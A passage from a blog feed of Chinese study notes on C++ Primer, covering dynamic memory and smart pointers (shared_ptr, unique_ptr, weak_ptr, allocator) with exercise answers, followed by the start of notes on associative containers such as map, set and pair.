class="type">int</span> *pi1 = <span class="keyword">new</span> <span class="type">int</span>;  <span class="comment">// 默认初始化，*pi1的值未定义</span></span><br><span class="line"><span class="type">int</span> *pi2 = <span class="keyword">new</span> <span class="built_in">int</span>();  <span class="comment">// 值初始化为0, *pi2为0</span></span><br></pre></td></tr></table></figure><p>对于一个定义了默认构造函数的类类型，其const动态对象可以隐式初始化，而其他类型的对象必须显式初始化。</p><p>个人理解：显式初始化可以通过初始化设初值或列表初始化实现，由于const动态对象是底层const，指针的值是修改的，所以不一定要显式初始化。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>(<span class="type">int</span> x) &#123; pci = <span class="keyword">new</span> <span class="built_in">int</span>(x); &#125;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> *pci;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> ci = <span class="number">10</span>;</span><br><span class="line"><span class="comment">//    const int ci;  // error: uninitialized const member in &#x27;const int&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>用<code>new</code>动态分配和初始化对象。<ul><li>用<code>new</code>分配const对象是合法的。分配并初始化一个const int: <code>const int *pci = new const int(1024);</code></li><li><code>new</code>无法为分配的对象命名（因为自由空间分配的内存是无名的），因此是返回一个指向该对象的指针。</li><li><code>int *pi = new int(123);</code> 接小括号是初始化值，接中括号是动态数组（new数组时中括号后面还能加小括号，但小括号中不能设定任何初始化值，加小括号时编译器提供默认初始化值，不加小括号时不提供任何初始值）。</li><li>一旦内存耗尽，会抛出类型是<code>bad_alloc</code>的异常。<br>可以使用 placemen new （定位new）可以让new在不能分配所需内存时返回一个空指针，而非抛出异常：<code>int *p2 = new (nothrow) int;</code><br><code>bad_alloc</code> 和 <code>nothrow</code> 的都定义在头文件 new 中。</li></ul></li><li>用<code>delete</code>销毁给定指针所指向的对象，并释放对应的内存。<ul><li>传递给delete的指针必须指向<strong>动态分配的内存</strong>，或是一个空指针。<br>释放一块非new分配的内存，或讲相同的指针释放多次都是未定义的。</li><li><code>delete</code>后的指针称为空悬指针（dangling pointer）。</li><li>虽然const对象的值不能被改变，但可以被销毁。</li></ul></li><li>使用<code>new</code>和<code>delete</code>管理动态内存存在三个常见问题：<ul><li>1.忘记<code>delete</code>内存。</li><li>2.使用已经释放掉的对象。</li><li>3.同一块内存释放两次。</li></ul></li><li>坚持只使用智能指针可以避免上述所有问题。</li></ul><h4 id="练习12-8">练习12.8</h4><p>Q: 下面的函数是否有错误？如果有，解释错误原因。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span>* p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A: 有错误。<code>p</code>会被强制转换成<code>bool</code>，继而没有释放指针 <code>p</code> 指向的对象。</p><h3 id="shared-ptr和new结合使用">shared_ptr和new结合使用</h3><ul><li><strong>接受指针参数的智能指针构造函数是explicit的</strong>，不能将内置指针隐式的转换为一个智能指针：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shared_ptr&lt;<span class="type">int</span>&gt; p1 = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">1024</span>);  <span class="comment">// 错误：必须使用直接初始化</span></span><br><span class="line"><span class="function">shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">p2</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>(<span class="number">1024</span>))</span></span>;  <span class="comment">// 正确</span></span><br><span class="line"></span><br><span class="line"><span class="function">shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">clone</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">int</span>(p);  <span class="comment">// 错误，不能隐式转换为shared_ptr&lt;int&gt;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_ptr</span>&lt;<span class="type">int</span>&gt;(<span class="keyword">new</span> <span class="built_in">int</span>(p));  <span class="comment">// 正确</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不要混合使用普通指针和智能指针，也不要使用<code>get</code>初始化另一个智能指针或为智能指针赋值。<br><code>get</code>函数是为了这样一种情况设计的：我们需要向不能使用智能指针的代码传递一个内置指针。</li><li>默认情况下，一个用来初始化智能指针的普通指针必须指向动态内存，因为智能指针默认使用delete释放所关联的对象（但也可提供自己的操作来代替delete，如下）。</li></ul><p><strong>定义和改变shared_ptr的其他方法</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>shared_ptr&lt;T&gt; p(q)</code></td><td><code>p</code>管理内置指针<code>q</code>所指向的对象；<code>q</code>必须指向<code>new</code>分配的内存，且能够转换为<code>T*</code>类型</td></tr><tr><td><code>shared_ptr&lt;T&gt; p(u)</code></td><td><code>p</code>从<code>unique_ptr u</code>那里接管了对象的所有权；将<code>u</code>置为空</td></tr><tr><td><code>shared_ptr&lt;T&gt; p(q, d)</code></td><td><code>p</code>接管了内置指针<code>q</code>所指向的对象的所有权。<code>q</code>必须能转换为<code>T*</code>类型。<code>p</code>将使用可<strong>调用对象<code>d</code>来代替<code>delete</code></strong>。</td></tr><tr><td><code>shared_ptr&lt;T&gt; p(p2, d)</code></td><td><code>p</code>是<code>shared_ptr p2</code>的拷贝，唯一的区别是<code>p</code>将可调用对象<code>d</code>来代替<code>delete</code>。</td></tr><tr><td><code>p.reset()</code></td><td><strong>若<code>p</code>是唯一指向其对象的<code>shared_ptr</code>，<code>reset</code>会释放此对象</strong>。若传递了可选的参数内置指针<code>q</code>，会令<code>p</code>指向<code>q</code>，否则会将<code>p</code>置空。若还传递了参数<code>d</code>，则会调用<code>d</code>而不是<code>delete</code>来释放<code>q</code>。</td></tr><tr><td><code>p.reset(q)</code></td><td>同上</td></tr><tr><td><code>p.reset(q, d)</code></td><td>同上</td></tr></tbody></table><ul><li><p>不能将一个指针赋予shared_ptr: <code>p = new int(1024);</code><br>可以使用<code>reset</code>来将一个新的指针赋予一个shared_ptr:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!p.<span class="built_in">unique</span>())</span><br><span class="line">    p.<span class="built_in">reset</span>(<span class="keyword">new</span> <span class="built_in">string</span>(*p));  <span class="comment">// 若我们不是唯一用户，则分配新的拷贝</span></span><br><span class="line">*p += newVal; </span><br></pre></td></tr></table></figure></li></ul><h4 id="练习12-10">练习12.10</h4><p>Q: 下面的代码调用了第413页中定义的<code>process</code> 函数，解释此调用是否正确。如果不正确，应如何修改？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>(<span class="number">42</span>))</span></span>;</span><br><span class="line"><span class="built_in">process</span>(<span class="built_in">shared_ptr</span>&lt;<span class="type">int</span>&gt;(p));</span><br></pre></td></tr></table></figure><p>A: 正确。正常执行shared_ptr拷贝构造构造一个临时对象，共享引用计数+1，拷贝给形参后引用计数再+1，这个时候临时对象销毁，引用计数-1，函数结束后，<strong>形参销毁，引用计数-1</strong>，引用计数现在为1此时也只剩p一个实例了，如果程序结束，引用计数-1，p的析构函数释放资源。</p><h4 id="练习12-11">练习12.11</h4><p>Q: 如果我们像下面这样调用 <code>process</code>，会发生什么？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">process</span>(<span class="built_in">shared_ptr</span>&lt;<span class="type">int</span>&gt;(p.<span class="built_in">get</span>()));</span><br></pre></td></tr></table></figure><p>A: 这样会创建一个新的智能指针，它的引用计数为 1，这个智能指针所指向的空间与 <code>p</code> 相同。在表达式结束后，这个临时智能指针会被销毁，引用计数为 0，所指向的内存空间也会被释放。而导致 <code>p</code> 所指向的空间被释放，使得 <code>p</code> 成为一个空悬指针。</p><h4 id="练习12-12">练习12.12</h4><p>Q: <code>p</code> 和 <code>sp</code> 的定义如下，对于接下来的对 <code>process</code> 的每个调用，如果合法，解释它做了什么，如果不合法，解释错误原因：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> p = <span class="keyword">new</span> <span class="built_in">int</span>();</span><br><span class="line"><span class="keyword">auto</span> sp = <span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">(a) <span class="built_in">process</span>(sp);</span><br><span class="line">(b) <span class="built_in">process</span>(<span class="keyword">new</span> <span class="built_in">int</span>());</span><br><span class="line">(c) <span class="built_in">process</span>(p);</span><br><span class="line">(d) <span class="built_in">process</span>(<span class="built_in">shared_ptr</span>&lt;<span class="type">int</span>&gt;(p));</span><br></pre></td></tr></table></figure><p>A ：</p><ul><li>(a) 合法。将<code>sp</code> 拷贝给 <code>process</code>函数的形参，在函数里面引用计数为 2，函数结束后引用计数为 1。</li><li>(b) 不合法。不能从内置指针隐式转换为智能指针。</li><li>© 不合法。不能从内置指针隐式转换为智能指针。</li><li>(d) 合法。但是智能指针和内置指针一起使用可能会出现问题，在表达式结束后智能指针会被销毁，它所指向的对象也被释放。而此时内置指针 <code>p</code> 依旧指向该内存空间。之后对内置指针 <code>p</code> 的操作可能会引发错误。</li></ul><h4 id="练习12-13">练习12.13</h4><p>Q: 如果执行下面的代码，会发生什么？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> sp = <span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line"><span class="keyword">auto</span> p = sp.<span class="built_in">get</span>();</span><br><span class="line"><span class="keyword">delete</span> p;</span><br></pre></td></tr></table></figure><p>A: 智能指针 <code>sp</code> 所指向空间已经被释放，再对 <code>sp</code> 进行操作会出现错误。</p><h3 id="智能指针和异常">智能指针和异常</h3><ul><li>如果使用智能指针，<strong>即使程序块由于异常过早结束，智能指针类也能确保在内存不需要的时候将其释放</strong>。</li><li><strong>避免智能指针陷阱</strong>：<ul><li><strong>不用相同的内置指针初始化（或<code>reset</code>）多个智能指针</strong></li><li><strong>不<code>delete get()</code>返回的指针。</strong></li><li><strong>如果你使用<code>get()</code>返回的指针，记得当最后一个对应的智能指针销毁后，你的指针就无效了。</strong></li><li><strong>如果你使用智能指针管理的资源不是<code>new</code>分配的内存，记住传递给它一个删除器</strong>，比如connection。</li></ul></li></ul><h3 id="unique-ptr">unique_ptr</h3><ul><li>某一个时刻只能有一个<code>unique_ptr</code>指向一个给定的对象。</li><li>与shared_ptr不同，没有类似make_shared的标准函数。定义unique_ptr时，需要将其绑定到一个new返回的指针。与shared_ptr一样，必须采用直接初始化形式。</li><li><strong>不支持拷贝或者赋值操作</strong>。</li><li>向后兼容：<code>auto_ptr</code>：老版本，具有<code>unique_ptr</code>的部分特性。特别是，不能在容器中保存<code>auto_ptr</code>，也不能从函数返回<code>auto_ptr</code>。</li></ul><p><strong>unique_ptr操作</strong>:</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>unique_ptr&lt;T&gt; u1</code></td><td>空<code>unique_ptr</code>，可以指向类型是<code>T</code>的对象。<code>u1</code>会使用<code>delete</code>来是释放它的指针。</td></tr><tr><td><code>unique_ptr&lt;T, D&gt; u2</code></td><td><code>u2</code>会使用一个类型为<code>D</code>的可调用对象来释放它的指针。</td></tr><tr><td><code>unique_ptr&lt;T, D&gt; u(d)</code></td><td>空<code>unique_ptr</code>，指向类型为<code>T</code>的对象，用类型为<code>D</code>的对象<code>d</code>代替<code>delete</code></td></tr><tr><td><code>u = nullptr</code></td><td>释放<code>u</code>指向的对象，将<code>u</code>置为空。</td></tr><tr><td><code>u.release()</code></td><td><code>u</code>放弃对指针的控制权，<strong>返回指针</strong>，并将<code>u</code>置空**（并未立即释放，没有指针指向对象会自动释放）**。</td></tr><tr><td><code>u.reset()</code></td><td>释放<code>u</code>指向的对象</td></tr><tr><td><code>u.reset(q)</code></td><td>释放<code>u</code>指向的对象，令<code>u</code>指向<code>q</code>指向的对象</td></tr><tr><td><code>u.reset(nullptr)</code></td><td>将<code>u</code>置空</td></tr></tbody></table><ul><li>虽然不能拷贝或赋值 unique_ptr，但可以通过调用release或reset将指针的所有权从一个unique_ptr转移到另一个unique。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">unique_ptr&lt;string&gt; <span class="title">p2</span><span class="params">(p1.release())</span></span>;</span><br><span class="line"><span class="function">unique_ptr&lt;string&gt; <span class="title">p3</span><span class="params">(<span class="keyword">new</span> string(<span class="string">&quot;Trex&quot;</span>))</span></span>;</span><br><span class="line">p2.<span class="built_in">reset</span>(p3.<span class="built_in">release</span>());  <span class="comment">// reset释放了p2原来指向的内存</span></span><br><span class="line"></span><br><span class="line">p2.<span class="built_in">release</span>();  <span class="comment">// 错误：p2不会释放内存，而且我们丢失了指针</span></span><br><span class="line"><span class="keyword">auto</span> p = p2.<span class="built_in">release</span>();  <span class="comment">// 正确，但必须记得delete(p)</span></span><br></pre></td></tr></table></figure><ul><li>不能拷贝 unique_ptr 的规则有一个例外：可以拷贝或赋值一个即将要被销毁的 unique_ptr。比较常见的例子是向函数传递unique_ptr参数和返回unique_ptr。</li></ul><h4 id="练习12-17">练习12.17</h4><p>Q: 下面的 <code>unique_ptr</code> 声明中，哪些是合法的，哪些可能导致后续的程序错误？解释每个错误的问题在哪里。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ix = <span class="number">1024</span>, *pi = &amp;ix, *pi2 = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">2048</span>);</span><br><span class="line"><span class="keyword">typedef</span> unique_ptr&lt;<span class="type">int</span>&gt; IntP;</span><br><span class="line">(a) <span class="function">IntP <span class="title">p0</span><span class="params">(ix)</span></span>;</span><br><span class="line">(b) <span class="function">IntP <span class="title">p1</span><span class="params">(pi)</span></span>;</span><br><span class="line">(c) <span class="function">IntP <span class="title">p2</span><span class="params">(pi2)</span></span>;</span><br><span class="line">(d) <span class="function">IntP <span class="title">p3</span><span class="params">(&amp;ix)</span></span>;</span><br><span class="line">(e) <span class="function">IntP <span class="title">p4</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>(<span class="number">2048</span>))</span></span>;</span><br><span class="line">(f) <span class="function">IntP <span class="title">p5</span><span class="params">(p2.get())</span></span>;</span><br></pre></td></tr></table></figure><ul><li>(a) 不合法。在定义一个 <code>unique_ptr</code> 时，需要将其绑定到一个<code>new</code> 返回的指针上。</li><li>(b) 不合法。理由同上。</li><li>© 合法。但是也可能会使得 <code>pi2</code> 成为空悬指针。</li><li>(d) 不合法。当 <code>p3</code> 被销毁时，它试图释放一个栈空间的对象。</li><li>(e) 合法。</li><li>(f) 不合法。<code>p5</code> 和 <code>p2</code> 指向同一个对象，当 <code>p5</code> 和 <code>p2</code> 被销毁时，会使得同一个指针被释放两次。</li></ul><h4 id="练习12-18">练习12.18</h4><p>Q: <code>shared_ptr</code> 为什么没有 <code>release</code> 成员？</p><p>A: <code>release</code> 成员的作用是放弃控制权并返回指针，因为在某一时刻只能有一个 <code>unique_ptr</code> 指向某个对象，<code>unique_ptr</code> 不能被赋值，所以要使用 <code>release</code> 成员将一个 <code>unique_ptr</code> 的指针的所有权传递给另一个 <code>unique_ptr</code>。而 <code>shared_ptr</code> 允许有多个 <code>shared_ptr</code> 指向同一个对象，因此不需要 <code>release</code> 成员。</p><h3 id="weak-ptr">weak_ptr</h3><ul><li><code>weak_ptr</code>是一种<strong>不控制所指向对象生存期</strong>的智能指针。</li><li>指向一个由<code>shared_ptr</code>管理的对象，不改变<code>shared_ptr</code>的引用计数。</li><li>一旦最后一个指向对象的<code>shared_ptr</code>被销毁，对象就会被释放，不管有没有<code>weak_ptr</code>指向该对象。</li></ul><p><strong>weak_ptr操作</strong>:</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>weak_ptr&lt;T&gt; w</code></td><td>空<code>weak_ptr</code>可以指向类型为<code>T</code>的对象</td></tr><tr><td><code>weak_ptr&lt;T&gt; w(sp)</code></td><td>与<code>shared_ptr</code>指向相同对象的<code>weak_ptr</code>。<code>T</code>必须能转换为<code>sp</code>指向的类型。</td></tr><tr><td><code>w = p</code></td><td><code>p</code>可以是<code>shared_ptr</code>或一个<code>weak_ptr</code>。赋值后<code>w</code>和<code>p</code>共享对象。</td></tr><tr><td><code>w.reset()</code></td><td>将<code>w</code>置为空。</td></tr><tr><td><code>w.use_count()</code></td><td>与<code>w</code>共享对象的<code>shared_ptr</code>的数量。</td></tr><tr><td><code>w.expired()</code></td><td>若<code>w.use_count()</code>为0，返回<code>true</code>，否则返回<code>false</code></td></tr><tr><td><code>w.lock()</code></td><td>如果<code>expired</code>为<code>true</code>，则返回一个空<code>shared_ptr</code>；否则返回一个指向<code>w</code>的对象的<code>shared_ptr</code>。</td></tr></tbody></table><h2 id="动态数组">动态数组</h2><h3 id="new和数组">new和数组</h3><ul><li><p><code>new T[]</code>一个动态数组：</p><ul><li>类型名之后加一对方括号，指明分配的对象数目（必须是整型，不必是常量）。</li><li>返回<strong>指向第一个对象的指针</strong>。</li><li><code>int *p = new int[size];</code></li></ul></li><li><p><code>delete []</code>一个动态数组：</p><ul><li><code>delete [] p;</code></li></ul></li><li><p><code>unique_ptr</code>和数组：</p><ul><li>指向数组的<code>unique_ptr</code>不支持成员访问运算符（点和箭头），毕竟 <code>unique_ptr</code> 指向的是一个数组而不是单个对象。</li><li>当一个unique_ptr指向一个数组时，可以使用下标运算符来访问数组中的元素。</li></ul></li><li><p><code>shared_ptr</code>和数组：</p><ul><li><strong><code>shared_ptr</code> 不支持直接支持管理动态数组</strong>（使用默认删除器delete删除动态数组是未定义的），如果一定要用，必须提供自定义的删除器，如<code>shared_ptr&lt;int&gt; sp(new int[10], [](int *p) &#123;delete[] p;&#125;);</code></li><li><code>shared_ptr</code>未定义下标运算符，而且智能指针类型不支持指针算术运算。为了访问数组中的元素，必须用get获取一个内置指针，然后用其来访问数组元素。</li></ul></li></ul><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>unique_ptr&lt;T[]&gt; u</code></td><td><code>u</code>可以指向一个动态分配的数组，整数元素类型为<code>T</code></td></tr><tr><td><code>unique_ptr&lt;T[]&gt; u(p)</code></td><td><code>u</code>指向内置指针<code>p</code>所指向的动态分配的数组。<code>p</code>必须能转换为类型<code>T*</code>。</td></tr><tr><td><code>u[i]</code></td><td>返回<code>u</code>拥有的数组中位置<code>i</code>处的对象。<code>u</code>必须指向一个数组。</td></tr></tbody></table><h3 id="allocator类">allocator类</h3><ul><li>标准库<code>allocator</code>类定义在头文件<code>memory</code>中，帮助我们将内存分配和对象构造分离开。</li><li>分配的是原始的、未构造的内存。</li><li><code>allocator</code>是一个模板。</li><li><code>allocator&lt;string&gt; alloc;</code></li></ul><p><strong>标准库allocator类及其算法</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>allocator&lt;T&gt; a</code></td><td>定义了一个名为<code>a</code>的<code>allocator</code>对象，它可以为类型为<code>T</code>的对象分配内存</td></tr><tr><td><code>a.allocate(n)</code></td><td>分配一段原始的、未构造的内存，保存<code>n</code>个类型为<code>T</code>的对象。</td></tr><tr><td><code>a.deallocate(p, n)</code></td><td><strong>释放从<code>T*</code>指针<code>p</code>中地址开始的内存，这块内存保存了<code>n</code>个类型为<code>T</code>的对象</strong>；<code>p</code>必须是一个先前由<code>allocate</code>返回的指针。且<code>n</code>必须是<code>p</code>创建时所要求的大小。在<strong>调用<code>deallocate</code>之前，用户必须对每个在这块内存中创建的对象调用<code>destroy</code></strong>。</td></tr><tr><td><code>a.construct(p, args)</code></td><td><code>p</code>必须是一个类型是<code>T*</code>的指针，指向一块原始内存；<code>args</code>被传递给类型为<code>T</code>的构造函数，用来在<code>p</code>指向的内存中构造一个对象。</td></tr><tr><td><code>a.destroy(p)</code></td><td><code>p</code>为<code>T*</code>类型的指针，此算法对<code>p</code>指向的对象执行析构函数。</td></tr></tbody></table><ul><li>还未<code>construct</code>对象的情况下就使用原始内存是未定义的；我们只能对真正构造了的元素进行destroy操作。</li><li>一旦元素被销毁后，可以重新使用这部分内存来保存其他string，也可以通过<code>deallocate</code>来将其归还给系统。</li></ul><p><strong>allocator伴随算法</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>uninitialized_copy(b, e, b2)</code></td><td>从迭代器<code>b</code>和<code>e</code>给定的输入范围中拷贝元素到迭代器<code>b2</code>指定的未构造的原始内存中。<code>b2</code>指向的内存必须足够大，能够容纳输入序列中元素的拷贝。</td></tr><tr><td><code>uninitialized_copy_n(b, n, b2)</code></td><td>从迭代器<code>b</code>指向的元素开始，拷贝<code>n</code>个元素到<code>b2</code>开始的内存中。</td></tr><tr><td><code>uninitialized_fill(b, e, t)</code></td><td>在迭代器<code>b</code>和<code>e</code>执行的原始内存范围中创建对象，对象的值均为<code>t</code>的拷贝。</td></tr><tr><td><code>uninitialized_fill_n(b, n, t)</code></td><td>从迭代器<code>b</code>指向的内存地址开始创建<code>n</code>个对象。<code>b</code>必须指向足够大的未构造的原始内存，能够容纳给定数量的对象。</td></tr></tbody></table><ul><li>定义在头文件<code>memory</code>中。</li><li>在给定目的位置创建元素，而不是由系统分配内存给他们。</li><li><strong><code>uninitialized_copy</code>的目的位置迭代器必须指向还未构造的内存，与<code>copy</code>不同，<code>uninitialized_copy</code>会在给定目的位置构造元素。</strong></li><li>类似<code>copy</code>,<code>uninitialized_copy</code>会返回（递增后的）目的位置迭代器，即指向最后一个构造的元素之后的位置。</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第11章 关联容器</title>
      <link href="/2023/11/15/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch11/"/>
      <url>/2023/11/15/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch11/</url>
      
        <content type="html"><![CDATA[<ul><li>关联容器和顺序容器的不同：关联容器中的元素时按照<strong>关键字</strong>来保存和访问的。</li><li>关联容器支持通过关键字来高效地查找和读取元素，基本的关联容器类型是 <code>map</code>和 <code>set</code>。</li></ul><p><strong>关联容器类型</strong>：</p><ul><li>map和multimap在头文件map中；set和multiset在头文件set中</li><li>无序容器分别定义在unordered_map和unordered_set中</li><li>当从map中提取一个元素时，会得到一个pair类型的对象<br>pair是一个模版类型，保存两个名为first和second的（公有）数据成员</li><li>set的底层实现是红黑树</li></ul><table><thead><tr><th>容器类型</th><th>解释</th></tr></thead><tbody><tr><td>按顺序存储</td><td></td></tr><tr><td><code>map</code></td><td>关键数组：保存<code>关键字-值</code>对</td></tr><tr><td><code>set</code></td><td>关键字即值，即只保存关键字的容器</td></tr><tr><td><code>multimap</code></td><td>支持同一个键多次出现的<code>map</code></td></tr><tr><td><code>multiset</code></td><td>支持同一个键多次出现的<code>set</code></td></tr><tr><td>无序集合</td><td></td></tr><tr><td><code>unordered_map</code></td><td>用哈希函数组织的<code>map</code></td></tr><tr><td><code>unordered_set</code></td><td>用哈希函数组织的<code>set</code></td></tr><tr><td><code>unordered_multimap</code></td><td>哈希组织的<code>map</code>，关键字可以重复出现</td></tr><tr><td><code>unordered_multiset</code></td><td>哈希组织的<code>set</code>，关键字可以重复出现</td></tr></tbody></table><h2 id="关联容器概述">关联容器概述</h2><ul><li>关联容器不支持顺序容器的位置相关的操作，比如push_back。</li><li>关联容器也不支持构造函数或插入操作这些接受一个元素值和一个数量值的操作。</li><li>关联容器的迭代器是双向的。</li></ul><h3 id="定义关联容器">定义关联容器</h3><ul><li>需要指定元素类型。</li><li>列表初始化：<ul><li><code>map</code>：<code>map&lt;string, int&gt; word_count = &#123;&#123;"a", 1&#125;, &#123;"b", 2&#125;&#125;;</code><br>{key, value} 的方式可以用来初始化pair</li><li><code>set</code>：<code>set&lt;string&gt; exclude = &#123;&quot;the&quot;, &quot;a&quot;&#125;;</code></li></ul></li><li>从一个值范围来初始化关联列表：<ul><li><code>set&lt;int&gt; iset(ivec.cbegin(), ivec.cend());</code></li></ul></li></ul><h3 id="关键字类型的要求">关键字类型的要求</h3><ul><li><p>对于有序容器，关键字类型必须定义元素比较的方法。默认是<code>&lt;</code>。</p></li><li><p>如果想传递一个比较的函数，可以这样定义：<code>multiset&lt;Sales_data, decltype(compareIsbn)*&gt; bookstore(compareIsbn);</code> 即需要提供关键字类型和比较操作类型——应该是一种函数指针类型。</p><ul><li><p>用compareIsbn来初始化bookstore对象，这表示向bookstore添加元素时，通过调用compareIsbn来为这些元素排序。</p></li><li><p>bookstore中的元素以ISBN的顺序进行排列。</p></li><li><p>注意当使用decltype来获得一个函数指针类型时，必须加上一个*来指定我们要使用给定函数类型的指针。</p></li><li><p>参数用compareIbn和&amp;compareIsbn效果相同，当使用函数名字时，在需要时它会自动转化为一个指针。</p></li></ul></li></ul><h4 id="练习11-10">练习11.10</h4><p>Q:  定义一个<code>map</code>，将单词与一个行号的<code>list</code>关联，<code>list</code>中保存的是单词所出现的行号。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::map&lt;std::string, std::list&lt;std::<span class="type">size_t</span>&gt;&gt; m;</span><br></pre></td></tr></table></figure><h4 id="练习11-11">练习11.11</h4><p>Q: 可以定义一个<code>vector&lt;int&gt;::iterator</code> 到 <code>int</code> 的<code>map</code>吗？<code>list&lt;int&gt;::iterator</code> 到 <code>int</code> 的<code>map</code>呢？对于两种情况，如果不能，解释为什么。</p><p>可以定义 <code>vector&lt;int&gt;::iterator</code> 到 <code>int</code> 的<code>map</code>，但是不能定义 <code>list&lt;int&gt;::iterator</code> 到 <code>int</code> 的<code>map</code>。因为<code>map</code>的键必须实现 <code>&lt;</code> 操作，<code>list</code> 的迭代器不支持比较运算。</p><h3 id="pair">pair</h3><ul><li>在<code>utility</code>头文件中定义。</li><li>一个<code>pair</code>保存两个数据成员，两个类型不要求一样。</li></ul><p><strong>pair的操作</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>pair&lt;T1, T2&gt; p;</code></td><td><code>p</code>是一个<code>pair</code>，两个类型分别是<code>T1</code>和<code>T2</code>的成员都进行了<strong>值初始化</strong>。</td></tr><tr><td><code>pair&lt;T1, T2&gt; p(v1, v2);</code></td><td><code>first</code>和<code>second</code>分别用<code>v1</code>和<code>v2</code>进行初始化。</td></tr><tr><td><code>pair&lt;T1, T2&gt;p = &#123;v1, v2&#125;;</code></td><td>等价于`p(v1, v2)</td></tr><tr><td><code>make_pair(v1, v2);</code></td><td><code>pair</code>的类型从<code>v1</code>和<code>v2</code>的类型推断出来。</td></tr><tr><td><code>p.first</code></td><td>返回<code>p</code>的名为<code>first</code>的数据成员。</td></tr><tr><td><code>p.second</code></td><td>返回<code>p</code>的名为<code>second</code>的数据成员。</td></tr><tr><td><code>p1 relop p2</code></td><td>运算关系符按字典序定义。</td></tr><tr><td><code>p1 == p2</code></td><td><strong>必须两对元素两两相等</strong></td></tr><tr><td><code>p1 != p2</code></td><td>同上</td></tr></tbody></table><h2 id="关联容器操作">关联容器操作</h2><p><strong>关联容器额外的类型别名</strong>：</p><table><thead><tr><th>类型别名</th><th>解释</th></tr></thead><tbody><tr><td><code>key_type</code></td><td>此容器类型的关键字类型</td></tr><tr><td><code>mapped_type</code></td><td>每个关键字关联的类型，只适用于<code>map</code></td></tr><tr><td><code>value_type</code></td><td>对于<code>map</code>，是<code>pair&lt;const key_type, mapped_type&gt;</code>; 对于<code>set</code>，和<code>key_type</code>相同。</td></tr></tbody></table><ul><li>map&lt;string, int&gt;::value_type v3;  // <strong>v3是一个pair&lt;const string, int&gt;</strong></li><li>map&lt;string, int&gt;::mapped_type v4;  // <strong>v5是一个int</strong></li></ul><h3 